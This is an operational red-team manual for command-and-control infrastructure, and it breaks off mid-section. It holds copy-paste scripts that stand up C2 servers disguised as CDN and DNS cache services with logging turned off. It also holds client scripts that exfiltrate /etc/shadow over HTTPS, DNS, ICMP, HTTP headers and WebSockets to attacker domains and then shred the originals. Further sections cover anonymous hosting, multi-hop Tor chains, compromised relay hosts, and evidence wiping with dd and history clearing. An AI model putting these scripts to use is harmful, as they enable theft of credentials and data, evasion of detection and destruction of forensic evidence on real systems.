# GHOST-HUNT // C2 ENVIRONMENT

> **Version:** 2.2  
> **Classification:** RED TEAM INFRASTRUCTURE  
> **Framework:** GHOST-HUNT // x0rTr0n  
> **Author:** Red Team  
> **Status:** ACTIVE  
> **Focus:** Command & Control Infrastructure — Build, Deploy, Rotate, Burn

---

## 1. C2 ARCHITECTURE PHILOSOPHY

> *"The C2 is the nervous system of the operation. Cut it, and the body dies. Hide it, and the body becomes invisible."*

| Principle | Meaning | Result |
|---|---|---|
| **Disposable** | Every server is ephemeral | No attribution trail |
| **Rotating** | Infrastructure rotates per operation | Fresh footprint each time |
| **Layered** | Multi-hop chains obscure origin | Defenders trace to dead ends |
| **Mimetic** | C2 blends with legitimate services | DNS queries look like CDN traffic |
| **Encrypted** | All links are TLS or custom crypto | Traffic is opaque |

---

## 2. C2 INFRASTRUCTURE MAP

### 2.1 Topology

```
[OPERATOR] → [ENTRY NODE] → [RELAY NODE] → [EXFIL SERVER] → [OFFLINE STORAGE]
    ↑              ↑               ↑               ↑               ↑
  Tor/VPN      VPS (burn)     VPS (hop)      Dedicated      Encrypted
  obliquity    front-end      middle-tier    receiver       cold storage
```

### 2.2 Node Types

| Node | Purpose | Lifespan | Stealth Requirement |
|---|---|---|---|
| **Entry Node** | Operator access point | Per-session | Maximum — Tor, VPN chains |
| **Relay Node** | Traffic forwarding | Per-operation | High — looks like CDN/proxy |
| **Exfil Server** | Data reception | Per-operation | Very High — valid TLS cert |
| **Cold Storage** | Offline data vault | Long-term | Physical — air-gapped |

### 2.3 Infrastructure Providers

| Provider Type | Use Case | Payment | Burn Speed |
|---|---|---|---|
| **Crypto VPS** | Anonymous hosting | Monero/XMR | Instant (cancel anytime) |
| **Cloud Mega** | Legitimate-looking endpoints | Clean card/billing | Slow (30-day billing) |
| **Compromised Hosts** | Relay nodes | N/A | Variable |
| **Onion Services** | Operator access | N/A | Persistent |
| **CDN/Edge** | Traffic blending | Clean billing | Medium |

---

## 3. HTTPS C2 SERVER

### 3.1 Architecture

```
[CLIENT] ── HTTPS POST ──► [NGINX] ──► [UPLOAD HANDLER] ──► [ENCRYPTED STORE]
                │                              │
          Valid TLS cert                 Python/Go handler
          Legit domain                   AES-256 decrypt
          CDN fronting                   Verify, store, acknowledge
```

### 3.2 Server Setup

```bash
# ──── C2 Server Bootstrap ────
# Ubuntu 22.04 minimal VPS — anonymous payment

# 1. BASELINE
apt update && apt upgrade -y
apt install -y nginx certbot python3 python3-pip ufw

# 2. FIREWALL — allow only 443
ufw default deny incoming
ufw allow 443/tcp
ufw allow 22/tcp  # operator SSH (key-only)
ufw enable

# 3. DOMAIN & TLS
# Point legit-looking domain (e.g., cdn-analytics-<random>.com) to VPS IP
certbot certonly --standalone -d cdn-analytics-<random>.com

# 4. NGINX — looks like a CDN endpoint
cat > /etc/nginx/sites-available/c2 << 'NGINX_EOF'
server {
    listen 443 ssl http2;
    server_name cdn-analytics-<random>.com;

    ssl_certificate     /etc/letsencrypt/live/cdn-analytics-<random>.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-analytics-<random>.com/privkey.pem;

    # Mimic CDN behavior — return 404 for GET, accept POSTs
    location / {
        if ($request_method = GET) {
            return 404;
        }
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    # Legitimate-looking health endpoint
    location /health {
        return 200 '{"status":"ok"}';
        add_header Content-Type application/json;
    }

    # Legitimate-looking static content
    location /static/ {
        root /var/www/cdn-assets;
        autoindex off;
    }

    access_log off;  # No server-side logs
    error_log /dev/null;
}
NGINX_EOF

ln -s /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
rm /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx

# 5. UPLOAD HANDLER (Python)
cat > /opt/c2/handler.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.fernet import Fernet
import json, os, hashlib

EXFIL_DIR = "/opt/c2/incoming"
KEY = os.environ.get("C2_KEY").encode()  # Set at runtime

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)

        # Decrypt
        f = Fernet(KEY)
        plaintext = f.decrypt(body)

        # Store with content hash
        file_hash = hashlib.sha256(plaintext).hexdigest()[:16]
        chunk_id = self.headers.get('X-Chunk-ID', file_hash)
        chunk_seq = self.headers.get('X-Chunk-Seq', '0')

        os.makedirs(EXFIL_DIR, exist_ok=True)
        path = os.path.join(EXFIL_DIR, f"{chunk_id}_{chunk_seq}.bin")
        with open(path, 'wb') as out:
            out.write(plaintext)

        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_GET(self):
        self.send_response(404)
        self.end_headers()

    def log_message(self, *args):
        pass  # No logging

HTTPServer(('127.0.0.1', 8080), Handler).serve_forever()
PYEOF

# 6. SYSTEMD — auto-restart
cat > /etc/systemd/system/c2-handler.service << 'SVC_EOF'
[Unit]
Description=CDN Cache Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/c2/handler.py
Environment="C2_KEY=<generated-fernet-key>"
Restart=always
RestartSec=5
User=nobody
WorkingDirectory=/opt/c2

[Service]
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=/opt/c2/incoming

[Install]
WantedBy=multi-user.target
SVC_EOF

systemctl daemon-reload
systemctl enable c2-handler
systemctl start c2-handler

# 7. HARDEN
chmod 700 /opt/c2
chown nobody:nogroup /opt/c2/incoming
# Remove bash history
history -c && rm -f ~/.bash_history
```

### 3.3 Client-Side Exfil Script

```python
# ──── Exfil Client ────
import requests, os, hashlib
from cryptography.fernet import Fernet

C2_URL = "https://cdn-analytics-<random>.com"
KEY = Fernet.generate_key()
f = Fernet(KEY)

def exfil_file(filepath, chunk_size=1024*1024):
    """Encrypt, chunk, and exfiltrate a file via HTTPS POST."""
    with open(filepath, 'rb') as fh:
        data = fh.read()

    encrypted = f.encrypt(data)
    file_hash = hashlib.sha256(data).hexdigest()[:16]
    chunks = [encrypted[i:i+chunk_size] for i in range(0, len(encrypted), chunk_size)]

    for seq, chunk in enumerate(chunks):
        requests.post(
            C2_URL,
            data=chunk,
            headers={
                'X-Chunk-ID': file_hash,
                'X-Chunk-Seq': str(seq),
                'User-Agent': 'Mozilla/5.0 (compatible; Analytics/1.0)',  # Looks legit
            },
            timeout=30
        )

    os.remove(filepath)  # Cover: delete original
```

---

## 4. DNS TUNNELING C2

### 4.1 Architecture

```
[CLIENT] ── DNS Query (A/AAAA/TXT) ──► [AUTHORITATIVE NS] ──► [DNSCAT2 SERVER]
                   │                              │
              Encoded data                   Controlled domain
              Chunked ≤255B                  ns1.cdn-cache-<random>.com
```

### 4.2 Server Setup

```bash
# ──── DNS C2 Server ────
# Need: controlled domain + VPS running authoritative DNS

# 1. DOMAIN CONFIGURATION
# Register domain: cdn-cache-<random>.com (anonymous)
# Set glue records:
#   ns1.cdn-cache-<random>.com → <VPS_IP>
#   ns2.cdn-cache-<random>.com → <VPS_IP>

# 2. DNSCAT2 SERVER
apt install -y ruby ruby-dev build-essential
gem install dnscat2

# Start server — listens for DNS queries on subdomain
dnscat2 --dns "domain=cdn-cache-<random>.com,host=0.0.0.0,port=53" \
        --security=open \
        --no-cache

# 3. FIREWALL — allow UDP 53
ufw allow 53/udp

# 4. HARDEN
# Bind to authoritative-only queries
# Drop non-DNS traffic to port 53
```

### 4.3 DNS Exfil Client Commands

```bash
# ──── Target-Side DNS Exfil ────

# Option A: dnscat2 client
dnscat2 cdn-cache-<random>.com

# Option B: Manual DNS exfil (bash — no tools needed)
# Encode file as hex, chunk into 60-char segments, send as TXT queries
hex_data=$(xxd -p /etc/shadow | tr -d '\n')
chunk_size=60
for i in $(seq 0 $chunk_size $((${#hex_data} - 1))); do
    chunk="${hex_data:$i:$chunk_size}"
    dig @<dns_server> TXT "${chunk}.cdn-cache-<random>.com" +short
    sleep $((RANDOM % 5 + 2))  # Timing jitter
done

# Option C: Iodine (IP-over-DNS — full tunnel)
iodined -f -P <password> 10.0.0.1 cdn-cache-<random>.com
# Client side:
iodine -f -P <password> cdn-cache-<random>.com
```

---

## 5. COVERT CHANNEL C2

### 5.1 ICMP Tunneling

```bash
# ──── ICMP C2 Server ────
# Uses ICMP echo request/reply for data transfer

# Server (receiver)
apt install -y icmptx
icmptx -s <server_ip> -p <password>

# Client (sender — on target)
icmptx -c <server_ip> -p <password>
# Now /dev/tun0 is a tunnel — SSH, SCP, HTTP over ICMP

# Manual ICMP exfil (bash — no tools)
# Send file as ICMP payloads
python3 -c "
import socket, os, time, struct
data = open('/etc/shadow','rb').read()
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
dest = '<server_ip>'
for i in range(0, len(data), 1400):
    chunk = data[i:i+1400]
    # Build ICMP echo request with chunk as payload
    # (checksum calc omitted for brevity — use scapy in practice)
    s.sendto(chunk, (dest, 0))
    time.sleep(1)  # Low-and-slow
"
```

### 5.2 HTTP Header Covert Channel

```bash
# ──── HTTP Header C2 ────
# Data embedded in custom HTTP headers — looks like CDN tracking

# Client (target)
python3 -c "
import requests, base64
data = open('/etc/shadow','rb').read()
encoded = base64.b64encode(data).decode()
chunks = [encoded[i:i+200] for i in range(0, len(encoded), 200)]
for seq, chunk in enumerate(chunks):
    requests.get('https://cdn-analytics-<random>.com/beacon.gif',
        headers={
            'X-Tracking-ID': chunk,
            'X-Sequence': str(seq),
            'User-Agent': 'Mozilla/5.0',
            'Referer': 'https://analytics.example.com/dashboard'
        })
"
```

### 5.3 WebSocket Covert Channel

```python
# ──── WebSocket C2 ——
# Bidirectional, full-duplex, blends with real-time web apps

# Server
import asyncio, websockets
import json, os

EXFIL_DIR = "/opt/c2/ws_incoming"

async def handler(websocket, path):
    async for message in websocket:
        data = json.loads(message)
        chunk_id = data.get('id', '0')
        payload = data.get('data', '')
        os.makedirs(EXFIL_DIR, exist_ok=True)
        with open(f"{EXFIL_DIR}/{chunk_id}.bin", 'ab') as f:
            f.write(bytes.fromhex(payload))
        await websocket.send(json.dumps({"status": "ok"}))

asyncio.get_event_loop().run_until_complete(
    websockets.serve(handler, '0.0.0.0', 443, ssl=ssl_context)
)

# Client
import asyncio, websockets, json, os

async def exfil(filepath):
    async with websockets.connect('wss://cdn-analytics-<random>.com/socket') as ws:
        data = open(filepath, 'rb').read()
        chunks = [data[i:i+4096] for i in range(0, len(data), 4096)]
        for seq, chunk in enumerate(chunks):
            await ws.send(json.dumps({
                'id': f"{os.path.basename(filepath)}_{seq}",
                'data': chunk.hex()
            }))
            await asyncio.sleep(0.5)  # Rate limit

asyncio.run(exfil('/etc/shadow'))
```

---

## 6. CLOUD-BASED C2

### 6.1 Cloud Storage as C2 Receiver

```bash
# ──── S3 / GCS / Azure Blob as C2 Dead Drop ────

# Server: Create bucket with public write, private read
# AWS S3:
aws s3api create-bucket --bucket cdn-analytics-logs-<random> --region us-east-1
aws s3api put-bucket-policy --bucket cdn-analytics-logs-<random> --policy '{
    "Statement": [{
        "Effect": "Allow",
        "Principal": "*",
        "Action": "s3:PutObject",
        "Resource": "arn:aws:s3:::cdn-analytics-logs-<random>/*"
    }]
}'

# Client upload
aws s3 cp /tmp/exfil_data.enc s3://cdn-analytics-logs-<random>/analytics_$(date +%s).dat
# — OR —
curl -X PUT "https://cdn-analytics-logs-<random>.s3.amazonaws.com/data.bin" \
     --data-binary @/tmp/exfil_data.enc

# Pull from operator workstation
aws s3 sync s3://cdn-analytics-logs-<random>/ /opt/cold-storage/
```

### 6.2 Cloud Functions as C2

```python
# ──── AWS Lambda C2 Handler ────
# Functions look like normal API endpoints

import json, boto3, os, base64

s3 = boto3.client('s3')
BUCKET = 'cdn-analytics-logs-<random>'

def lambda_handler(event, context):
    # Looks like a logging endpoint
    body = json.loads(event.get('body', '{}'))
    data = base64.b64decode(body.get('log', ''))

    # Store in S3 with innocuous naming
    key = f"analytics/{context.aws_request_id}.log"
    s3.put_object(Bucket=BUCKET, Key=key, Body=data)

    return {
        'statusCode': 200,
        'body': json.dumps({'ingested': True})
    }

# Deployed behind API Gateway with valid domain
# curl https://api.logs-analytics.com/ingest -d '{"log":"<base64_data>"}'
```

---

## 7. MULTI-HOP C2 CHAINS

### 7.1 3-Hop Chain Architecture

```
[OPERATOR]        [ENTRY]          [RELAY]          [EXFIL]
  Tor  ──►  VPS-1 (SSH) ──►  VPS-2 (reverse) ──►  VPS-3 (receiver)
           Monero VPS        Crypto VPS          Clean cloud VPS
           Burn every 24h    Rotate per op       Valid cert
```

### 7.2 SSH Tunnel Chains

```bash
# ──── Build the chain ────

# 1. Operator → Entry node (through Tor)
torsocks ssh -i /dev/shm/entry_key operator@<entry_ip> -p 2222

# 2. Entry → Relay (reverse SSH tunnel)
# On entry node:
ssh -i /dev/shm/relay_key -R 0.0.0.0:9090:localhost:22 relay@<relay_ip>

# 3. Relay → Exfil (forward)
# On relay:
ssh -i /dev/shm/exfil_key -L 8080:localhost:8080 operator@<exfil_ip>

# Now: operator → entry → relay → exfil server
# Traffic path: Tor → VPS1 → VPS2 → VPS3
# Each hop has different provider, payment, jurisdiction
```

### 7.3 Proxy Chains (Multiple Layers)

```bash
# ──── Layered Proxies ────

# On operator machine — chain multiple SOCKS proxies
cat > /etc/proxychains4.conf << 'EOF'
strict_chain
quiet_mode
[ProxyList]
socks5  127.0.0.1 9050    # Tor
socks5  <entry_ip> 1080   # VPS-1 SOCKS
socks5  <relay_ip> 1080   # VPS-2 SOCKS
EOF

# All traffic now: Tor → VPS-1 → VPS-2
proxychains4 curl https://exfil-server.com
proxychains4 ssh operator@<exfil_ip>
```

---

## 8. INFRASTRUCTURE OBFUSCATION

### 8.1 Domain & Certificate Strategy

| Strategy | Implementation | Stealth |
|---|---|---|
| **Legitimate TLD** | `.com`, `.net`, `.io` — not `.xyz`, `.tk` | High |
| **Typosquatting** | `cdn-analytics.com` vs `cdn-analytlcs.com` | Medium |
| **Expired Domains** | Buy expired domain with existing reputation | Very High |
| **Subdomain Hijacking** | Claim abandoned subdomain of legitimate service | Very High |
| **Let's Encrypt** | Valid, free, auto-renewing TLS certs | High |

### 8.2 Traffic Shaping

```bash
# ──── Mimic CDN traffic patterns ────

# iptables rate limiting — max 100 packets/min
iptables -A OUTPUT -p tcp --dport 443 -m limit --limit 100/minute -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -j DROP

# Randomize packet timing
# Use iptables statistic module for random drops (looks like packet loss)
iptables -A OUTPUT -p tcp --dport 443 -m statistic --mode random --probability 0.02 -j DROP

# Padding — add random bytes to match CDN packet sizes
# Implement in exfil client: pad each chunk to exactly 1460 bytes
```

### 8.3 Credential Rotation

| Credential | Rotation Frequency | Method |
|---|---|---|
| **SSH Keys** | Per-operation | Ed25519, generated fresh |
| **TLS Certs** | 90-day auto-renew | Let's Encrypt |
| **API Keys** | Per-operation | Generated, stored in env |
| **Encryption Keys** | Per-file | Fernet/Fernet.generate_key() |
| **Passwords** | Never reused | `pwgen -s 64 1` |

---

## 9. INFRASTRUCTURE ROTATION

### 9.1 Burn Schedule

| Asset | Lifespan | Burn Trigger |
|---|---|---|
| **Entry VPS** | 24 hours | After each session |
| **Relay VPS** | 1 operation | After exfil complete |
| **Exfil Server** | 1 operation | After data verified |
| **Domains** | 1 operation | After DNS cache cleared |
| **Certificates** | Per-domain | With domain |
| **Cloud Accounts** | Per-operation | After data exfiltrated |

### 9.2 Clean Burn Procedure

```bash
# ──── Burn Checklist ────

# 1. VERIFY DATA — confirm all exfil data received and verified
sha256sum /opt/c2/incoming/*.bin > /tmp/receipt.txt

# 2. PULL DATA — transfer to offline storage
rsync -avz --remove-source-files /opt/c2/incoming/ operator@cold-storage:/data/

# 3. WIPE SERVER
# On each C2 node:
shred -vfz /opt/c2/**/*
shred -vfz /var/log/**/*
dd if=/dev/urandom of=/dev/sda bs=1M status=progress
# Then terminate VPS instance

# 4. BURN DOMAIN
# Transfer domain to burner registrar account
# Or simply let it expire (disable auto-renew)

# 5. ROTATE CREDENTIALS
# Generate new keys for next operation
ssh-keygen -t ed25519 -f /dev/shm/next_op_key -N ""
python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"

# 6. CLEAN LOCAL
shred -vfz ~/.ssh/known_hosts
history -c && rm -f ~/.bash_history ~/.zsh_history
```

---

## 10. C2 TOOLING MATRIX

### 10.1 Tools by C2 Method

| C2 Method | Tool | Language | Detection Profile |
|---|---|---|---|
| **HTTPS** | Custom handler | Python/Go | Low — mimics CDN |
| **DNS** | dnscat2 | Ruby/C | Very Low — blends with DNS |
| **DNS** | Iodine | C | Low — IP-over-DNS |
| **ICMP** | icmptx | C | Medium — ICMP is monitored |
| **WebSocket** | Custom ws server | Python/Node | Very Low — real-time apps |
| **Cloud** | rclone + S3/GCS | Go | Very Low — authorized tools |
| **SSH Tunnel** | OpenSSH | C | Low — legitimate remote admin |
| **Reverse Proxy** | chisel, frp | Go | Medium — tunnel detection |

### 10.2 Tool Deployment

| Tool | Server Setup Time | Client Footprint | Notes |
|---|---|---|---|
| **dnscat2** | 5 min | ~2MB binary | Pre-compile for target arch |
| **Custom HTTPS** | 15 min | ~50KB script | Blend with web traffic |
| **Iodine** | 5 min | ~500KB binary | Needs kernel module |
| **chisel** | 2 min | ~8MB single binary | Fastest tunnel |
| **rclone** | 5 min | ~40MB binary | Very loud but authorized |
| **OpenSSH** | 0 min (built-in) | Built-in | Most legitimate appearance |

---

## 11. PRE-STAGED C2 KIT

| Resource | Location | Status | Notes |
|---|---|---|---|
| **Domains** | Registrar accounts | 5+ pre-registered | Legitimate TLDs only |
| **VPS Instances** | Crypto providers | 3+ ready | Different jurisdictions |
| **TLS Certificates** | Let's Encrypt | Auto-renew | Per domain |
| **SSH Keys** | Offline storage | Per-operation | Ed25519 only |
| **Encryption Keys** | Generated fresh | Per-operation | Python `cryptography` |
| **Tool Binaries** | Compiled archive | All archs | Obfuscated, packed |
| **Cold Storage** | Air-gapped drives | Ready | LUKS encrypted |
| **Burn Scripts** | Offline | Tested | Automated wipe |

---

## 12. C2 QUICK-START GUIDES — FULL DEPLOYMENT

> *"A C2 that takes longer to deploy than the operation itself is a liability. These are copy-paste-complete. No decisions. Just execute."*

---

### 12.1 HTTPS C2 — 5 Minutes From Zero to Receiving Data

#### 12.1.1 Prerequisites (Pre-Staged)

| Item | Required | How to Get |
|---|---|---|
| **VPS** | Ubuntu 22.04, 1GB RAM, anonymous | Crypto VPS paid with Monero — Privex, 1984, Njalla |
| **Domain** | `.com` / `.net` TLD, anonymous | Njalla, Njal.la (Monero accepted) |
| **DNS** | A record: domain → VPS IP | Set at registrar panel |

#### 12.1.2 Server: One-Shot Bootstrap

```bash
# ──── PASTE THIS ENTIRE BLOCK ON THE VPS ────
# Run as root. Takes ~90 seconds. Zero user input required.

set -e
DOMAIN="<REPLACE_WITH_YOUR_DOMAIN>"
FERNET_KEY=$(python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())")

echo "[*] Bootstrapping C2 on $DOMAIN"

# 1. Packages
apt update -qq && apt install -y -qq nginx certbot python3 python3-pip ufw > /dev/null 2>&1
pip3 install -q cryptography

# 2. Firewall
ufw --force reset > /dev/null
ufw default deny incoming > /dev/null
ufw allow 443/tcp > /dev/null
ufw --force enable > /dev/null

# 3. TLS Certificate (Let's Encrypt)
certbot certonly --standalone -d "$DOMAIN" --non-interactive --agree-tos \
  --email "admin@$DOMAIN" --quiet

# 4. NGINX — CDN mimic
cat > /etc/nginx/sites-available/c2 << NGINXEOF
server {
    listen 443 ssl http2;
    server_name $DOMAIN;
    ssl_certificate     /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        if (\$request_method = GET) { return 404; }
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header X-Forwarded-For \$remote_addr;
        client_max_body_size 100M;
    }

    location /health { return 200 '{"status":"ok"}'; add_header Content-Type application/json; }
    location /static/ { root /var/www/cdn-assets; autoindex off; }

    access_log off;
    error_log /dev/null;
}
NGINXEOF

ln -sf /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx

# 5. Python Handler
mkdir -p /opt/c2/incoming
cat > /opt/c2/handler.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.fernet import Fernet
import json, os, hashlib, sys

KEY = sys.argv[1].encode() if len(sys.argv) > 1 else os.environ["C2_KEY"].encode()
EXFIL_DIR = "/opt/c2/incoming"

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            cl = int(self.headers.get('Content-Length',0))
            body = self.rfile.read(cl)
            pt = Fernet(KEY).decrypt(body)
            fh = hashlib.sha256(pt).hexdigest()[:16]
            cid = self.headers.get('X-Chunk-ID', fh)
            seq = self.headers.get('X-Chunk-Seq', '0')
            os.makedirs(EXFIL_DIR, exist_ok=True)
            with open(f"{EXFIL_DIR}/{cid}_{seq}.bin", 'wb') as f:
                f.write(pt)
            self.send_response(200)
            self.send_header('Content-Type','application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        except: pass
    def do_GET(self): self.send_response(404); self.end_headers()
    def log_message(self,*a): pass

HTTPServer(('127.0.0.1',8080),H).serve_forever()
PYEOF

# 6. Systemd service — masked as CDN cache
cat > /etc/systemd/system/cdn-cache.service << SVC
[Unit]
Description=CDN Cache Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/c2/handler.py
Environment="C2_KEY=$FERNET_KEY"
Restart=always
RestartSec=5
User=nobody
WorkingDirectory=/opt/c2
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=/opt/c2/incoming
[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable cdn-cache --now

# 7. OpSec
chmod 700 /opt/c2
chown nobody:nogroup /opt/c2/incoming
unset HISTFILE && history -c && rm -f ~/.bash_history

# 8. Output credentials
echo ""
echo "╔══════════════════════════════════════╗"
echo "║  C2 ACTIVE                          ║"
echo "╠══════════════════════════════════════╣"
echo "║  URL:    https://$DOMAIN            ║"
echo "║  KEY:    $FERNET_KEY               ║"
echo "║  STATUS: $(systemctl is-active cdn-cache)                      ║"
echo "╚══════════════════════════════════════╝"
echo ""
```

#### 12.1.3 Client: Exfil Script (Copy to Target)

```python
# ──── exfil.py — Paste on target machine ────
# No dependencies beyond Python 3.6+ stdlib

import http.client, json, os, hashlib, ssl, sys
from cryptography.fernet import Fernet

C2_HOST = "<YOUR_DOMAIN>"
FERNET_KEY = b"<YOUR_KEY_FROM_SERVER_OUTPUT>"

def exfil_file(filepath, chunk_mb=1):
    """Encrypt, chunk, POST to C2. Delete original on success."""
    with open(filepath, 'rb') as f:
        data = f.read()

    encrypted = Fernet(FERNET_KEY).encrypt(data)
    fhash = hashlib.sha256(data).hexdigest()[:16]
    chunk_size = chunk_mb * 1024 * 1024
    chunks = [encrypted[i:i+chunk_size] for i in range(0, len(encrypted), chunk_size)]

    ctx = ssl.create_default_context()
    for seq, chunk in enumerate(chunks):
        conn = http.client.HTTPSConnection(C2_HOST, context=ctx, timeout=30)
        conn.request('POST', '/', body=chunk, headers={
            'X-Chunk-ID': fhash,
            'X-Chunk-Seq': str(seq),
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/octet-stream'
        })
        resp = conn.getresponse()
        conn.close()
        if resp.status != 200:
            print(f"[!] Chunk {seq} failed: {resp.status}")
            return False
        print(f"[*] Chunk {seq+1}/{len(chunks)} sent ({len(chunk)} bytes)")

    # Cover: shred original
    with open(filepath, 'ba+') as f:
        f.seek(0)
        f.write(os.urandom(len(data)))
    os.remove(filepath)
    print(f"[+] Exfil complete: {filepath}")
    return True

# ──── Usage ────
if __name__ == '__main__':
    for target in sys.argv[1:]:
        exfil_file(target)
```

#### 12.1.4 Verify: Pull Data from C2

```bash
# From operator workstation:
scp -i ~/.ssh/c2_key root@<VPS_IP>:/opt/c2/incoming/*.bin ./loot/

# Reassemble chunks by ID, then decrypt:
python3 << 'EOF'
import os, glob
from cryptography.fernet import Fernet

KEY = b"<YOUR_KEY>"

files = sorted(glob.glob('./loot/*.bin'))
by_id = {}
for f in files:
    cid = os.path.basename(f).split('_')[0]
    by_id.setdefault(cid, []).append(f)

for cid, chunks in by_id.items():
    data = b''
    for c in sorted(chunks):
        with open(c, 'rb') as f:
            data += f.read()
    plaintext = Fernet(KEY).decrypt(data)
    outfile = f'./loot/{cid}_decrypted.bin'
    with open(outfile, 'wb') as f:
        f.write(plaintext)
    print(f'[+] Reassembled: {outfile} ({len(plaintext)} bytes)')
EOF
```

#### 12.1.5 Takedown (Post-Op Burn)

```bash
# On C2 server — nuke everything
systemctl stop cdn-cache
shred -vfz /opt/c2/incoming/* /opt/c2/handler.py
rm -rf /opt/c2
systemctl disable cdn-cache
rm /etc/systemd/system/cdn-cache.service
systemctl daemon-reload
certbot delete --cert-name "$DOMAIN" --non-interactive
rm /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/c2
nginx -t && systemctl restart nginx
dd if=/dev/urandom of=/dev/sda bs=1M count=100 status=progress  # Partial wipe
# Terminate VPS from provider panel
```

| Check | ✓ |
|---|---|
| ☐ C2 handler stopped | `systemctl is-active cdn-cache` → `inactive` |
| ☐ Cert revoked | `certbot certificates` → empty |
| ☐ Nginx default only | `ls /etc/nginx/sites-enabled/` → `default` |
| ☐ VPS terminated | Provider panel → Instance → Destroy |

---

### 12.2 DNS C2 — 5 Minutes to Full Tunnel

#### 12.2.1 Prerequisites

| Item | Required | How to Get |
|---|---|---|
| **VPS** | Static IP, UDP 53 open | Crypto VPS (any OS with Ruby) |
| **Domain** | Full control, anonymous | Njalla (Monero) |
| **NS Glue** | ns1/ns2 → VPS IP | Set at registrar |

#### 12.2.2 Server: One-Shot DNS C2 Bootstrap

```bash
# ──── PASTE THIS ENTIRE BLOCK ON THE VPS ────
set -e
DOMAIN="<YOUR_DOMAIN>"
VPS_IP=$(curl -s ifconfig.me)

echo "[*] Bootstrapping DNS C2 on $DOMAIN ($VPS_IP)"

# 1. Packages
apt update -qq && apt install -y -qq ruby ruby-dev build-essential ufw > /dev/null 2>&1
gem install -q dnscat2

# 2. Firewall
ufw --force reset > /dev/null
ufw default deny incoming > /dev/null
ufw allow 53/udp > /dev/null
ufw allow 53/tcp > /dev/null
ufw --force enable > /dev/null

# 3. Systemd — auto-start on boot, auto-restart on crash
cat > /etc/systemd/system/dns-c2.service << SVC
[Unit]
Description=DNS Resolver Cache
After=network.target
[Service]
Type=simple
ExecStart=/usr/local/bin/dnscat2 --dns "domain=$DOMAIN,host=0.0.0.0,port=53" --security=open --no-cache
Restart=always
RestartSec=5
User=nobody
[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable dns-c2 --now

# 4. OpSec
unset HISTFILE && history -c && rm -f ~/.bash_history

echo ""
echo "╔══════════════════════════════════════╗"
echo "║  DNS C2 ACTIVE                      ║"
echo "╠══════════════════════════════════════╣"
echo "║  DOMAIN: $DOMAIN                    ║"
echo "║  IP:     $VPS_IP                    ║"
echo "║  STATUS: $(systemctl is-active dns-c2)                      ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo "[!] REMEMBER: Set NS glue records at registrar:"
echo "    ns1.$DOMAIN → $VPS_IP"
echo "    ns2.$DOMAIN → $VPS_IP"
```

#### 12.2.3 Client: DNS Exfil — Three Methods

```bash
# ──── METHOD A: dnscat2 (full tunnel — requires binary on target) ────
# Pre-compile for target arch (do this on your build box):
#   apt install -y ruby-dev build-essential
#   gem install dnscat2
#   # Binary is at: /var/lib/gems/*/gems/dnscat2-*/bin/dnscat2

# On target — establish tunnel:
./dnscat2 <YOUR_DOMAIN>
# Once connected, you get an interactive shell through DNS
# Commands: shell → spawns a session → type 'session -i 1' to interact
```

```bash
# ──── METHOD B: Python DNS exfil (stdlib only — no binary needed) ────
# Paste this on target. Exfiltrates a file via TXT record queries.

python3 << 'PYEOF'
import socket, time, random, os, sys, hashlib, base64

DOMAIN = "<YOUR_DOMAIN>"
FILEPATH = "/etc/shadow"                    # Change this
CHUNK_SIZE = 40                              # Keep ≤ 60 chars

with open(FILEPATH, 'rb') as f:
    data = f.read()

# Encrypt with simple XOR (adds stealth, breaks plaintext detection)
key = hashlib.sha256(b"<PRE_SHARED_SECRET>").digest()
encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Encode to hex-safe chars
encoded = base64.b32encode(encrypted).decode().rstrip('=')
chunks = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]

print(f"[*] Exfiltrating {len(data)} bytes in {len(chunks)} chunks via DNS")

for seq, chunk in enumerate(chunks):
    query = f"{chunk}.x{seq}.{DOMAIN}"
    try:
        socket.gethostbyname(query)
    except:
        pass  # We don't care about response — server logs the query
    delay = 1 + random.random() * 4  # 1-5 second jitter
    time.sleep(delay)
    if seq % 10 == 0:
        print(f"[*] Sent {seq+1}/{len(chunks)} chunks")

print(f"[+] Exfil complete: {FILEPATH}")

# Cover: shred original
with open(FILEPATH, 'ba+') as f:
    f.seek(0)
    f.write(os.urandom(len(data)))
os.remove(FILEPATH)
PYEOF
```

```bash
# ──── METHOD C: Iodine (IP-over-DNS — full tunnel, needs kernel module) ——
# Server:
